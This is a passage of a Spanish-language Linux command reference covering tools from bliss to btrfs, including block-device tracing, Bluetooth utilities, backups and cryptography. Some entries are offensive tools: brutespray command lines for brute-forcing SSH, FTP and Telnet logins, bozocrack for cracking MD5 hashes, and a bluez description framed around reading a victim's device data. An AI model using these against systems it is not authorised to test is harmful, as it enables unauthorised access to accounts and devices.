bliss no tiene capacidades de visualización gráfica; su propósito es calcular automorfismos y formas canónicas de grafos. Sin embargo, se puede visualizar el grafo utilizando herramientas externas como Graphviz, convirtiendo el archivo DIMACS en un formato legible por Graphviz como DOT mediante un script de conversión a .dot:
$ nano dimacs_to_dot.sh
    #!/bin/bash
    input="$1"
    output="$2"
    #
      echo "graph Grafo {" > "$output"
      grep "^e" "$input" | while read -r line; do
      node1=$(echo "$line" | awk '{print $2}')
      node2=$(echo "$line" | awk '{print $3}')
      echo "    $node1 -- $node2;" >> "$output"
    done
      echo "}" >> "$output"
$ chmod +x dimacs_to_dot.sh
$ ./dimacs_to_dot.sh grafo.dimacs grafo.dot
Una vez generado el archivo grafo.dot con laherramienta dot de Graphviz se genera una imagen .png
$ cat grafo.dot
    graph Grafo {
          1 -- 2;
          1 -- 3;
          2 -- 4;
          2 -- 5;
          3 -- 6;
          }
$ dot -Tpng grafo.dot -o grafo.png (creado grafo.png se puede abrir con cualquier visor de imágenes)
$ dot -Tx11 grafo.dot (o desde la terminal)


blkid
Muestra uuid de cada partición y el tipo de formato.
# blkid
Tambien con:
$ ls -lF /dev/disk/by-uuid/
# blkid -i /dev/sda (Información sobre los sectores)


blkreplay
Utilidad que controla la capa de bloques del sistema operativo mientras mide la latencia y el rendimiento de las operaciones de I/O para su posterior visualización.
# blkreplay /dev/sda (reproducir una carga simple en un dispositivo específico)
# blkreplay --fill-random=100 /dev/sdb (reproducir una carga artificial de lecturas y escrituras aleatorias)
# blkreplay --replay-start=0 --replay-end=60 /dev/sdc (reproducir una carga durante un período específico)
# blkreplay --verbose --with-verify /dev/sdd (reproducir con la máxima información y verificación de datos)
# blkreplay --acc-factor=2 /dev/sde (reproducir con un factor de aceleración)
# blkreplay --no-stalls /dev/sdf (reproducir sin esperas entre grupos)


blktool
Se utiliza para consultar o cambiar la configuración de un dispositivo de bloque que funciona en dispositivos SCSI, IDE y SATA. Asegúrarse de conocer lo que se está modificando antes de hacer cambios..
# blktool /dev/sda (obtener información general sobre un dispositivo de bloque como su tamaño, tipo, estado, etc.)
# blktool /dev/sda geometry (ver la geometría del disco)
# blktool /dev/sda sector-sz (ver el tamaño del sector)
# blktool /dev/sda pio-mode 4 (cambiar el modo de transferencia de datos en ATA)
# blktool /dev/sda wcache on (habilitar/deshabilitar el caché de escritura)
# blktool /dev/sda sleep (poner el dispositivo en modo de sueño)
# blktool -t scsi /dev/sdb (especificando tipo de dispositivo)
# blktool -f /dev/sdc reset (deshabilita la escritura forzosa de buffers)


blktrace
Herramienta avanzada para rastrear eventos en dispositivos de bloques del kernel, como discos duros, SSD, o dispositivos NVMe. Incluye herramientas adicionales como blkparse [para analizar los datos generados] e iowatcher [para generar gráficos visuales del rendimiento],
# blktrace -d /dev/sda (especifica el dispositivo de bloque a rastrear y genera archivos "sda.blktrace.*" en el directorio actual. Para detener Ctrl+c)
# blktrace -d /dev/sda -o - | blkparse -i - (enviar los datos de salida, como lecturas, escrituras, y sincronizaciones a la pantalla y analizar la salida en tiempo real)
# blkparse -i sda.blktrace.0 -o resultado.txt (especifica el archivo de rastreo generado previamente por blktrace y guarda el análisis en resultado.txt)
# iowatcher -t sda.blktrace.0 -o rendimiento.svg (especifica el archivo de rastreo y genera un gráfico .SVG que muestra la actividad y que se puede visonar con el navegador o un visor)
# blktrace -d /dev/sda -d /dev/sdb (rastrea varios dispositivos a la vez y genera archivos separados sda.blktrace.* y sdb.blktrace.*)
# blkparse -i sda.blktrace.0 -i sdb.blktrace.0 -o combinado.txt (crea un archivo combinado.txt con el análisis combinado de ambos dispositivos)
# blktrace -d /dev/sda -w 10 (rastrea durante 10 segundos y luego se detiene automáticamente)
# blktrace -d /dev/sda | blkparse -a write -o escrituras.txt (filtra eventos relacionados con escrituras y guarda en escrituras.txt)
# blktrace -d /dev/sda -o - | blkparse | grep "latency" (busca problemas de latencia en los eventos)
# blkparse -i sda.blktrace.0 -s (muestra un resumen de estadísticas como latencias promedio y número de operaciones)


blockfinder
Enumera la información de red por países.
$ blockfinder -i (actualizar la caché)
$ blockfinder -v -t SP (buscar el recurso deseado en el país de su elección)
$ blockfinder -v -t SP:ipv4 (filtrar los resultados de un protocolo específico)


bluemon
Monitorea la calidad del enlace de un dispositivo Bluetooth.
$ hcitool scan (identificar la dirección o nombre del dispositivo Bluetooth que quieres monitorear)
          Scanning ...
          	00:1A:7D:DA:71:13	Teclado-Bluetooth
$ bluemon -d 00:1A:7D:DA:71:13 (monitorea la conexión con el dispositivo cuya MAC se ha especificado)
$ bluemon -d 00:1A:7D:DA:71:13 -c "notify-send 'Bluetooth conectado' 'El dispositivo se ha conectado'" (mostrar mensaje cuando se conecta)
$ bluemon -d 00:1A:7D:DA:71:13 -x "notify-send 'Bluetooth desconectado' 'El dispositivo se ha desconectado'" (cuando se desconecta)
$ bluemon -d 00:1A:7D:DA:71:13 -s 10 (define el umbral de calidad. Valores bajos hacen que bluemon sea más sensible a la pérdida de calidad)
$ bluemon -d 00:1A:7D:DA:71:13 -c "echo 'Teclado conectado'" & (para monitorear varios dispositivos ejecutar en segundo plano)
$ bluemon -d 00:1B:63:84:45:67 -c "echo 'Auriculares conectados'" &
$ bluemon -d 00:1A:7D:DA:71:13 >> ~/bluemon.log 2>&1 & (monitoreo detallado en segundo plano y gardado en un registro)


bluez
Es una herramienta que se puede utilizar para manipular atributos de un dispositivo Bluetooth Low Energy [BLE]. Es principalmente útil para averiguar los servicios y características de un dispositivo BLE disponible para que los datos de la víctima puedan ser leídos/escritos según el atacante. Consta de varios ejecutables; bluemoon, bluetoothctl, btattach, btmgmt, btmon, ciptool, gatttool, hciattach, hciconfig, hcidump, hcitool, hex2hcd, l2ping, l2test, mpris-proxy, obexctl, rctest, rfcomm, sdptool y bluetoothd
$ hcitool dev (averiguar los dispositivos accesibles)
$ hcitool lescan (escaneo de baja energía. El resultado puede ser F2:C5:F2:0A:BF:C8)
$ hcidump (monitorear la actividad de Bluetooth)
$ gatttool -b F2:C5:F2:0A:BF:C8 -I (conectar al dispositivo encontrado)
$ gatttool --help-all (todas las opciones)
$ gatttool -i (iniciar la aplicación en modo interactivo)
$ gatttool --primary (Comprobación de los servicios disponibles del dispositivo BLE conectado)
$ sdptool browse F2:C5:F2:0A:BF:C8 (Con su identificador buscar el canal a utilizar)
$ obexftp -b F2:C5:F2:0A:BF:C8 -B 2 -p foto.jpg  (b, el dispositivo, B, el canal y p el archivo a mandar)
Nota.- En el dispositivo deberemos aceptar la transferencia
1.-
En /etc/bluetooth/pin introducimos la clave de acceso, normalmente 1234.
# /etc/init.d/bluetooth restart    (reiniciar el demonio)
Activar el bluetooth del móvil y verificar con:
# hcitool scan


bmon
Monitorizar el consumo de la conexión a internet. Una vez lanzado, pulsando "g" se muestra una pequeña grafica y con "d" una tabla de estadisticas. "RX Rate" son los paquetes recibidos y "TX Rate" los enviados. Pulsando "?" muestra una pequeña ayuda. Pulsar "q" para salir.
$ bmon -s 3 (Uso basico. Mostrara todos los interfaces de red, incluso los inactivos y refrescara cada 3 segundos)
$ bmon -p eth0 (Solo mostrara el especificado)
$ bmon -p eth0,eth1 (Mostrar los especificados)
$ bmon -i list (Muestra los modulos de entrada)
$ bmon -o list (Muestra los modulos de salida)
$ bmon -p eth0 -i proc (Mostrara solo el que afecta el modulo proc)
$ bmon -i proc:help (Solicitar informacion sobre un modulo)
Algunos parametros pueden colocarse en el archivo de configuracion:
$ nano .bmonrc
	policy eth0
	layout Statusbar red yellow reverse
Para no tener que especificar la red y con algun colorido. Los colores permitidos son: black, red, green, yellow, blue, magenta, cyan, white y default y sobre las partes de la ventana [layouts] que se puede incidir: Statusbar, List, Header, Selected y Default.


boinc
[boinc-client boinc-manager]Plataforma de software libre para la computación distribuida que comprende áreas tan diversas como matemáticas, medicina, biologia, astrofísica... Es una forma de aprovechar nuestros equipos durante los periodos de inactividad para que sean usados en el marco de investigaciones cientificas.
# /etc/init.d/boinc-client start (Arrancar el demonio)
$ boincmgr (Arrancar la gui para la configuración inicial)


bookman
Generar libros de las páginas man.
$ bookman -p -t “Paginas man” /usr/man/man1/* > man.pdf (en formato pdf [-p] y con título [-t])


bootchart
Ver el proceso de arranque en una imagen png. En la entrada del kernel en el grub colocar: init=/sbin/bootchartd
Ejemplo:
	title  Arch Linux
	root   (hd0,0)
	kernel /boot/vmlinuz26 root=/dev/sda2 init=/sbin/bootchartd ro
	initrd /boot/kernel26.img
Cuando el sistema haya arrancado lanzar:
# bootchart-render
	Parsing /var/log/bootchart.tgz
	Wrote image: ./bootchart.png
Lo que convertirá el ilegible archivo bootchart.tgz en una imágen en nuestro home. El archivo de configuración en /etc/bootchartd.conf


bootinfoscript
[boot-infor-script]. Genera un informe del arranque del sistema.
# bootinfoscript (genera el informe RESULTS.txt en el directorio /root)


bootlogd
Grabar los mensajes de inicio de sesión.
# bootlogd -l inicio.log (Especificando archivo. Por defecto en /var/log/boot)


bootparamd
Servidor que proporciona inforamción necesaria para el arranque de clientes sin disco. Antes de iniciar el servidor, se debe configurar el archivo:
# nano /etc/bootparams
Añadir la linea, por ejemplo:
       client root=nfsserver:/export/client/root
Este ejemplo configura el directorio root para el cliente "client" en el servidor NFS "nfsserver:/export/client/root".
$ bootparamd -d (iniciará el servidor en modo depuració y se podrán ver los mensajes cuando reciba solicitudes)


bootpc
Cliente de protocolo de arranque que se utiliza para obtener el número de IP de las máquinas, configurar servidores de nombres DNS y otra información útil.
$ bootpc -f archivo.cfg (solicitar un archivo de configuración al servidor DHCP)
$ bootpc -b archivo.bin (solicita una imagen de arranque)
$ bootpc (solicita información general de los servidores DHCP en la red)


borgbackup
Herramienta para realizar copias de seguridad seguras y eficientes mediante deduplicación, compresión y cifrado. La técnica de deduplicación de datos utilizada hace que sea adecuado para copias de seguridad diarias, ya que solo se almacenan los cambios.
$ borg init --encryption=repokey /home/USER/repositorio (antes de crear copias de seguridad se debe inicializar un repositorio con una clave cifrada)
$ borg create --progress --stats /home/USER/repositorio::docs-2024-11-28 /home/USER/Documentos (muestra progreso, proporciona estadisticas del respaldo)
$ borg list /home/USER/repositorio (muestra todos los respaldos existentes en un repositorio)
$ borg extract /home/USER/repositorio::docs-2024-11-28 --destination /home/USER/restauracion (restaura un respaldo a una ubicación especificada)
$ borg check /home/USER/repositorio (comprobar la integridad del repositorio)
$ borg delete /home/USER/repositorio::docs-2024-11-28 (elimina una copia de seguridad específica)
$ borg prune --keep-daily=7 --keep-weekly=4 --keep-monthly=6 /home/USER/repositorio (conserva los últimos 7 respaldos diarios, 4 semanales y 6 mensuales)
$ borg compact /home/USER/repositorio (compacta el espacio del repositorio tras eliminar archivos o datos redundantes)
# borg mount /home/USER/repositorio /mnt/backups (montar un repositorio y explorar sus respaldos como un sistema de archivos)
# borg umount /mnt/backups (desmontar)
$ borg create user@servidor:/home/USER/repositorio::respaldo-remoto /home/USER/datos (respaldar datos en un servidor remoto)


borgmatic
es un script contenedor de Python simple para el software de respaldo Borg que inicia un respaldo, elimina los respaldos antiguos según una política de retención y valida los respaldos para verificar su coherencia. El script permite especificar la configuración en un archivo de configuración declarativo en lugar de tener que colocarlos todos en la línea de comandos y maneja errores comunes. permite configurar y ejecutar las tareas típicas de BorgBackup mediante un único archivo de configuración, en lugar de depender de comandos individuales.
# borgmatic config generate (crea un archivo de configuración en /etc/borgmatic/config.yaml)
Un ejemplo de contenido básico podría ser:
    location:
       source_directories:
               - /ruta/a/respaldar
       repositories:
               - /ruta/a/repositorio
    storage:
       encryption_passphrase: "mi-contraseña-segura"
    retention:
       keep_daily: 7
       keep_weekly: 4
       keep_monthly: 6
    consistency:
       checks:
               - repository
               - archives
# borgmatic (verificar que funciona correctamente iniciará el respaldo, aplicará políticas de retención y validará el repositorio)
1.-
Automatización con Cron
$ crontab -e
Y agregar una línea como esta para respaldos diarios a las 2 a.m.:
          0 2 * * * /usr/bin/borgmatic


bosh
[Browsable Output SHell]. Herramienta diseñada para navegar y manipular de manera interactiva y eficiente sistemas de archivos y otros recursos. Se describe como una shell de salida navegable porque combina características de una shell estándar, como Bash, con una interfaz interactiva para navegar por directorios, ejecutar comandos y gestionar salidas. Con el navegador en file:///usr/share/doc/bosh/examples muestra 3 scripts: bof, bops y boss que pueden copiarse en /usr/local/bin y que implementan nuevas caracteristicas a la aplicación. Para salir de todas, Crl-x.
$ ls -al | bosh
$ ls -al | bops
$ cat archivo.txt | bosh
$ cat archivo.txt | bof


botan
Se utiliza para realizar diversas operaciones criptográficas, como cifrado, descifrado, generación de claves, hashes y firmas digitales. Admite una amplia variedad de algoritmos, como RSA, DSA, DES, AES, MD5 y SHA-1.
$ botan list (lista todos los algoritmos compatibles)
$ botan hash --algo=SHA-256 --output-format=hex archivo.txt (calcular el hash de un archivo usando el algoritmo SHA-256)
$ echo -n "Linux es un sistema genial" | botan hash --algo=SHA-256 --output-format=hex (calcular un hash para una cadena de texto)
$ botan gen_rsa --key-size=2048 > clave_privada.pem (generar un par de claves RSA con una longitud específica)
$ botan pubkey --pub --pem clave_privada.pem > clave_publica.pem (extraer la clave pública del comando anterior)
$ botan encrypt rsa clave_publica.pem archivo.txt > archivo_cifrado.bin (cifrar un archivo usando RSA)
$ botan decrypt rsa clave_privada.pem archivo_cifrado.bin > archivo_descifrado.txt (descifrar el archivo cifrado)
$ botan sign rsa clave_privada.pem archivo.txt > firma.bin (firmar un archivo usando RSA)
$ botan verify rsa clave_publica.pem archivo.txt firma.bin (verificar la firma)
$ botan pbkdf2 --algo=PBKDF2 --hash=SHA-256 --iter=100000 "contraseña" --salt=sal > clave_derivada.bin (usar una contraseña para derivar una clave segura)
$ botan rng 16 (generar 16 bytes de datos aleatorios)
$ botan keyinfo clave_privada.pem (ver detalles de una clave)
$ botan pkcs8 --pem clave_privada.der > clave_privada.pem (convertir una clave privada entre formatos PEM y DER)
1.-
Cifrar un archivo con AES en modo CBC:
Primero generar una clave y un IV [vector de inicialización]:
$ botan rng 32 > aes_key.bin
$ botan rng 16 > aes_iv.bin
Luego, cifra el archivo:
$ botan encrypt aes-256-cbc aes_key.bin aes_iv.bin archivo.txt > archivo_cifrado.bin
Descifrar el archivo cifrado:
$ botan decrypt aes-256-cbc aes_key.bin aes_iv.bin archivo_cifrado.bin > archivo_descifrado.txt


bottom
Muestra información (CPU, red, memoria RAM, procesos, temperaturas...) del equipo en tiempo real. Página del proyecto: https://github.com/ClementTsang/bottom
$ btm


boxes
[figlet lolcat]. Dibuja un marco en ascii entorno a un texto.
$ boxes -l | less (Ver todas las opciones de marco)
$ echo -e "Linux es un sistema genial" | boxes -d santa
$ echo -e "\nLinux\nes un sistema\ngenial" | boxes -d peek (Con saltos de linea en el texto [\n])
$ echo -e "\nLinux\nes un sistema\ngenial" | boxes -p a8t4 -d sunset (Con espacios en blanco alrededor del texto)
$ echo -e "\nLinux\nes un sistema\ngenial" | boxes -a c -d boy (texto alineado al centro [-a c])
Algunas otras opciones:
	-a l (texto alineado a la izquierda)
	-a r (texto alineado a la derecha)


bozocrack
Craquear contraseñas de hash md5 a partir de los resultados de su busqueda en google. Descarga de <https://github.com/juuso/BozoCrack>
Proceso:
Copiar el hash o hashses uno debajo de otro en un archivo de texto
$ bozocrack archivo.txt
	Nota.- dado que no usa diccionarios ni fuerza bruta sino solo busquedas de google, solamente se encontrarán las más usuales.


bpfmon
[Berkeley Packet Filter MONitor]. Monitorea la cantidad de bytes y paquetes que pasan por una interfaz de red específica.
# bpfmon enp1s0 "arp or ip" (cuenta los paquetes arp o ip en enp1s0)
# bpfmon any " " (cuenta todos los paquetes en todas las interfaces)
# bpfmon iptables "FORWARD 1" (cuenta los paquetes que coinciden con la primera regla en la tabla filter, chain FORWARD)
# bpfmon -z enp1s0 ip (muetra el gráfico en horizontal)
# bpfmon -N iptables "nat chn 3" (con los colores invertidos y cuenta los paquetes que coinciden con la tercera regla en la tabla nat, chain chn)
# bpfmon iptables (cuenta los paquetes que coinciden con una regla de iptables)


bpm-tools
Herramienta para calcular el tempo BPM [Beats-Per-Minute, pulsaciones por minuto] de la música. Incluye las herramientas bpm-graph y bpm-tag.
$ bpm-tag -f archivo.mp3 (solo muestra las BPM)
$ mpv archivo.mp3 | bpm -g file.dat
$ bpm-graph file.dat (ver el gráfico)


bpytop
Monitor de recursos que muestra el uso y las estadísticas del procesador, la memoria, los discos, la red y los procesos.
$ bpytop


braa
Escáner para realizar consultas SNMP [Simple Network Management Protocol] a varios dispositivos de red de manera rápida y eficiente.
$ braa public@192.168.1.1 system.sysDescr.0 (a la comunidad "public", dirección ip del dispositivo y al identificador de objeto [OID] que representa la descripción del sistema)
$ braa public@192.168.1.1,192.168.1.2,192.168.1.3 system.sysUpTime.0 (la herramienta consultará el tiempo de actividad [sysUpTime] de tres dispositivos separando las direcciones IP con comas)
$ braa public@192.168.1.1:162 system.sysName.0 (especificando el puerto 162 del dispositivo)
$ braa -t 5000 public@192.168.1.1 system.sysDescr.0 (tiempo de espera de 5 segundos para esperar respuesta de algún dispositivo)
$ braa -v public@192.168.1.1 system.sysContact.0 > resultados.txt (guardar los resultados en un archivo y con la máxima información)
$ braa public@192.168.1.1-192.168.1.5 system.sysLocation.0 (consultará el OID sysLocation en todos los dispositivos dentro del rango)
$ braa private@192.168.1.1 system.sysDescr.0 (si se utiliza una comunidad diferente de public ha de especificarse)
$ braa -d public@192.168.1.1 system.sysDescr.0 (activa el modo de depuración y muestra detalles adicionales y si algo no funciona correctamente)
1.- Leer dispositivos y OIDs desde archivos
$  cat devices.txt
	public@192.168.1.1
	public@192.168.1.2
	public@192.168.1.3
$ cat oids.txt
	system.sysDescr.0
	system.sysUpTime.0
$ braa -f devices.txt -o oids.txt


brebis
Herramienta diseñada para analizar copias de seguridad con el objetivo de verificar su integridad, detectar duplicados y obtener informes sobre los datos respaldados.
$ brebis -G /backups/backup.tar.gz (generar el archivo de configuración [.conf] y la lista de archivos [.list] para la copia de seguridad)
$ brebis -c /backups/backup.conf -l /var/log/brebis.log (indicando archivo de configuración y de registro)
$ brebis -g /backups/backup.tar.gz   (generar una lista de archivos dentro de una copia de seguridad)
$ brebis -d \( -g /backups/backup.tar.gz  (cambia el delimitador predeterminado de la lista de archivos generado por "-g" a "(")


brew
[build-essential curl git python-setuptools ruby]. En Debian el paquete se denomina linuxbrew-wrapper. Bifurcación de Homebrew, el administrador de paquetes de Mac OS, para Linux. Algunas de sus caracteristicas principales son que no requiere acceso root, permite instalar software no empaquetado por la distribución nativa y pueden instalarse versiones actualizadas de software cuando la distribución nativa es antigua.
$ brew doctor (Comprobar si linuxbrew esté instalado y funciona correctamente)
$ brew update (actualizar linuxbrew)
$ brew search (paquetes están disponibles)
$ brew upgrade (actualizar paquetes obsoletos)
$ brew upgrade paquete (actualizar un paquete especifico)
$ brew --cache (donde están los paquetes descargados)
$ brew install paquete (Instalar un paquete)
$ brew remove (Eliminar un paquete)


bridge-utils
Herramientas para configurar puentes Ethernet, útiles en redes virtuales y configuraciones de contenedores o máquinas virtuales. La conexión es completamente transparente: los hosts conectados a un dispositivo Ethernet ven a los hosts conectados a los otros dispositivos Ethernet directamente.
# brctl addbr br0 (crea un nuevo puente llamado br0)
# brctl addif br0 eth0 (agrega la interfaz física eth0 al puente br0. Esto conecta la interfaz al puente)
# brctl show (muestra los puentes configurados, las interfaces asociadas y otra información relevante)
# brctl delbr br0 (elimina el puente br0. Asegurarse de que no esté activo)
# brctl showstp br0 (muestra el estado del Spanning Tree Protocol [STP] para el puente br0)
# ip link set dev br0 up (activa el puente br0 después de configurarlo)
# ip link set dev br0 down (desactiva el puente)
# ip addr add 192.168.1.100/24 dev br0 (asigna la dirección IP 192.168.1.100 con una máscara de red de 24 bits al puente br0)
# brctl showmacs br0 (muestra las direcciones MAC en el puente br0 y sus tiempos)
# brctl stp br0 on (habilita el Protocolo Spanning Tree [STP] en el puente br0 para evitar bucles en la red)
# brctl setbridgeprio br0 32768 (establece la prioridad del puente br0, un número más bajo indica mayor prioridad)
# brctl delif br0 eth0 (quita la interfaz eth0 del puente br0)


brillo
Para definir el nivel de brillo de algunos portatiles podemos recurrir al siguiente comando:
# echo 2000 > /sys/class/backlight/acpi_video0/brightness
En el caso de las gráficas intel:
# echo 2000 > /sys/class/backlight/intel_backlight/brightness
Para ver el nivel de brillo máximo que permite la pantalla:
# cat /sys/class/backlight/acpi_video0/max_brightness
Y en intel:
# cat /sys/class/backlight/intel_backlight/max_brightness


bro
Monitor de seguridad que inspecciona todo el tráfico para detectar signos de actividad sospechosa y mediciones de rendimiento.
# mkdir bro && cd bro (crear el directorio y entrar en él porque genera varios archivos)
# bro -i eth0 (analizar el tráfico en la red eth0.)
Una vez cerrado el monitor con C-c listar los logs creados en el directorio [conn.log, dns.log, files.log, http.log,packet_filter.log, reporter.log, ssl.log, weird.log, x509.log] y visializarlos con cualquier editor.


broot
Enfoque moderno para generar árboles de directorios. Descarga:
$ curl -o broot -L https://dystroy.org/broot/download/x86_64-linux/broot
# mv broot /usr/local/bin
# chmod +x /usr/local/bin/broot
$ broot (para salir pulsar :q como en vim)
$ broot --sort-by-type-dirs-first -H (directorios primero y sin archivos ocultos)


bropages
Otra forma de visualizar las páginas man coloreando la sintaxis y mostrando ejemplos.
$ bro ls


brotli
Algoritmo de compresión de datos desarrollado por Google, para comprimir y descomprimir archivos, mediante una combinación de una variante moderna del algoritmo LZ77, codificación Huffman y modelado de contexto de segundo orden.
$ brotli archivo.txt (comprimir, substituye archivo.txt por archivo.txt.br)
$ brotli -q 11 archivo.txt (ajustando el nivel de compresión: de 1 a 11, donde 11 es el más alto y más lento)
$ brotli --keep archivo.txt (mantener el archivo original sin eliminarlo después de la compresión)
$ brotli -d archivo.txt.br (descomprimir)
$ brotli archivo.txt -o comprimido.br (especificando nombre de salida del comprimido)
$ brotli -d comprimido.br -o descomprimido.txt (especificando nombre de salida del descomprimido)
$ brotli archivo1.txt archivo2.txt (comprimir varios archivos)
$ cat archivo.txt | brotli > archivo_comprimido.br (comprimir desde la entrada estándar)
$ cat archivo_comprimido.br | brotli -d > archivo_descomprimido.txt (descomprimir desde la entrada estándar)
$ brotli --test archivo.txt.br (verificará si el archivo comprimido es válido)


brutespray
Este script de Python toma la salida GNMAP/XML de nmap, JSON separado por nuevas líneas, la salida `XML Export` de Nexpose o las exportaciones `.nessus` de Nessus y automáticamente fuerza bruta los servicios con credenciales predeterminadas usando Medusa. BruteSpray puede incluso encontrar puertos no estándar usando -sV dentro de Nmap.
$ brutespray --file results.gnmap -U user.txt -P pass.txt --threads 5 --hosts 5 (realiza un ataque de fuerza bruta contra los servicios abiertos detectados por Nmap, utilizando las credenciales especificadas)
$ brutespray --file results.gnmap --service ftp,ssh,telnet --threads 5 --hosts 5 (limita el ataque solo a los servicios FTP, SSH y Telnet)
$ brutespray --file results.gnmap -u admin -p password --threads 5 --hosts 5 (intenta atacar la cuenta de administrador con la contraseña especificada)
$ brutespray --file results.gnmap --threads 5 --hosts 5 -c (continúa el ataque incluso si se encuentra una combinación de credenciales válidas)
$ brutespray --file results.xml --threads 5 --hosts 5 (utiliza un archivo XML de Nmap para escaneo y ataque de fuerza bruta)
$ brutespray --file results.xml -i (abre el modo interactivo de Brutespray)


bsd-from
Imprime los encabezados de los correos del usuario que existen en el buzón del sistema.
$ bsd-from -c (La cantidad de mensajes que existen)
$ bsd-from -s usuario (Muestra los encabezados para el usuario en concreto)
$ bsd-from -f /var/mail/usuario (con más información)


bsdgames
Colección de algunos de los juegos basados en texto que se han disfrutado durante décadas en sistemas Unix. Incluye los siguientes: aventura, aritmética, atc, backgammon, battlestar, BCD, Boggle, César, Canfield, Countmail, Cribbage, Dab, go-fish, gomoku, hack, hangman, hunt, mille, monop, morse, number, pig, phantasia, pom, ppt, bonus, quiz, random, rain, robots, rot13, vela, serpiente, tetris, trek, wargames, gusanos, gusanos, wump, wtf


bsdmainutils
Paquete que contiene programas pequeños para el sistema BSD-style Unix. Proporciona banner (como printerbanner), calendar, col, colcrt, colrm, column, from (como bsd-from), hexdump (o hd), look, lorder, ncal (o cal), ul y write (como bsd-write).


btest
Herramienta diseñada para facilitar la ejecución y verificación de pruebas en proyectos de software. Su objetivo es proporcionar un controlador para un conjunto de pruebas basadas en shell. Cada prueba consta de un conjunto de líneas de comando que se ejecutarán y el éxito se determina en función de sus códigos de salida. Los comandos incluidos son utilidades complementarias que automatizan tareas relacionadas con la ejecución, comparación de resultados y manejo de pruebas y son las siguientes: btest-ask-update, btest-bg-run, btest-bg-run-helper, btest-bg-wait, btest-diff, btest-diff-rst, btest-progress, btest-rst-cmd, btest-rst-include, btest-rst-pipe y btest-setsid.
$ btest-ask-update resultado_actual.txt resultado_esperado.txt (comparará los dos archivos y pedirá confirmación para actualizar el archivo esperado si son diferentes)
$ btest-bg-run -- ./script_prueba.sh (ejecutará script_prueba.sh en segundo plano y generará archivos temporales para rastrear la prueba)
$ btest-bg-run -- --debug ./script.sh (obtener más detalles)
$ btest-bg-run-helper --start ./comando --opciones (comando interno que generalmente no se ejecuta manualmente, sino que es invocado por btest-bg-run para manejar procesos en segundo plano)
$ btest-bg-wait (asegura que las pruebas lanzadas con btest-bg-run se completen antes de continuar)
$ btest-diff resultado_actual.txt resultado_esperado.txt (compara archivos generados en una prueba y resalta las diferencias)
$ btest-diff-rst archivo1.rst archivo2.rst (compara archivos en formato RST [reStructuredText] y muestra diferencias específicas para este formato)
$ btest-progress (muestra el progreso de ejecución de las pruebas en tiempo real)
$ btest-rst-cmd ls -l (ejecuta ls -l y genera un bloque de salida en formato RST)
$ btest-rst-include archivo.txt (convierte el contenido de archivo.txt en un bloque RST)
$ btest-rst-pipe script.sh (convierte la salida en un bloque RST)
$ btest-setsid ./script_prueba.sh (ejecuta script_prueba.sh en un nuevo grupo de sesión, evitando interferencias de señales externas)


btop
Monitor de recursos de línea de comandos parecido a top y htop más moderno y colorido que muestra el uso y las estadísticas del procesador, la memoria, discos, red y procesos.
$ btop


btrbk
Herramienta de copia de seguridad para subvolúmenes del sistema de archivos btrfs. Permite sincronizar subvolúmenes locales o remotos, crear instantáneas y gestionar su retención. Primero crear un archivo de configuración para definir qué subvolúmenes respaldar, dónde guardarlos y cómo manejarlos. Un ejemplo básico de configuración:
# nano /etc/btrbk/btrbk.conf
target /backup/btrbk
target user@remote:/path/to/backup
snapshot_dir .snapshots
volume /mnt/btrfs
  subvolume home
  subvolume data
snapshot_preserve_min 3
snapshot_preserve_daily 7
snapshot_preserve_weekly 4
snapshot_preserve_monthly 12
Indica que se respaldarán los subvolúmenes "home" y "data" desde /mnt/btrfs hacia /backup/btrbk, si se trata de respaldar un servidor remoto, dejar el segundo"target". Las instantáneas se almacenarán en un subdirectorio llamado .snapshots y los snapshot_preserve que indican los snapshots a conservar [déjese el que se desea y suprimir los otros]: Las últimas 3 instantáneas, las últimas 7 diarias, las últimas 4 semanales o as últimas 12 mensuales.
# btrbk run (una vez configurado el archivo, realizar una copia de seguridad local o remoto, usando ssh, según proceda y eliminará las instantáneas antiguas según la política definida)
# btrbk run --dry-run (forma de virificar la configuración y mostrará las operaciones planeadas sin realizarlas)
# btrbk -v run (imprime información detallada sobre las operaciones)
1.-
Forma de sincronizar instantáneas desde un disco fuente /mnt/source a un disco destino /mnt/destination, con el archivo de confirugación:
# cat /etc/btrbk/btrbk.conf
volume /mnt/source
  target /mnt/destination
  subvolume home
  subvolume data
# btrbk run
2.-
Configuración para múltiples volúmenes:
# cat /etc/btrbk/btrbk.conf
volume /mnt/btrfs1
  subvolume home
  target /backup/btrfs1
volume /mnt/btrfs2
  subvolume data
  target /backup/btrfs2
3.-
Automatización con cron
# crontab -e
Y colocar la linea:
    0 2 * * * /usr/bin/btrbk run


btrfs
Herramienta para gestionar subvolúmenes, instantáneas, cuotas, y más en el sistema de archivos Btrfs.
# mkfs.btrfs /dev/sdX (formatea una partición o dispositivo con el sistema de archivos Btrfs)
# mount -t btrfs /dev/sdX /mnt (montar un partición)
# mount -t btrfs -o compress=zstd /dev/sdX /mnt (habilitar una compresión)
# btrfs subvolume create /mnt/home (crear un subvolúmene con los dos subvolúmenes llamados home y data en el punto de montaje /mnt)
# btrfs subvolume create /mnt/data
# btrfs subvolume list /mnt (listar los subvolúmenes mostrando ruta, ID y generación de cada subvolumen)
# btrfs subvolume delete /mnt/home (eliminar un subvolumen)
# btrfs subvolume snapshot -r /mnt/home /mnt/snapshots/home_backup (crear una instantánea de solo lectura)
# btrfs subvolume snapshot /mnt/home /mnt/snapshots/home_backup (crear una de lectura-escritura)
# btrfs filesystem df /mnt (verificar espació y otra información)
# btrfs filesystem usage /mnt (lo mismo)
# btrfs check /dev/sdX ( comprobar integridad del sistema de archivos)
# btrfs check --repair /dev/sdX (intentar reparar errores)
# btrfs device add /dev/sdY /mnt (permite agrupar varios discos en un único volumen, esto añade /dev/sdY al sistema montado en /mnt)
# btrfs device remove /dev/sdY /mnt (eliminar un dispositivo del conjunto)
# btrfs balance start -dconvert=raid1 -mconvert=raid1 /mnt (convierte los datos [dconvert]y metadatos [mconvert]a RAID 1)
# btrfs filesystem show (ver información detallada de dispositivos y configuraciónes)
# btrfs balance start /mnt (optimizar la distribución de datos en los dispositivos)
# btrfs balance start -dusage=50 /mnt (reequilibra bloques de datos con al menos el 50% de uso)
# btrfs filesystem defragment /mnt/home (defragmentar un subvolumen)
# btrfs filesystem defragment -czstd /mnt/home (desfragmentar con la compresión activada)
1.-
Para restaurar datos desde una instantánea:
# btrfs subvolume delete /mnt/home (eliminar la antigua)
# btrfs subvolume snapshot /mnt/snapshots/home_backup /mnt/home
2.-
Habilitar cuotas y verificar uso por subvolumen. Primero, activar las cuotas para habilitar el seguimiento del uso de espacio:
# btrfs quota enable /mnt
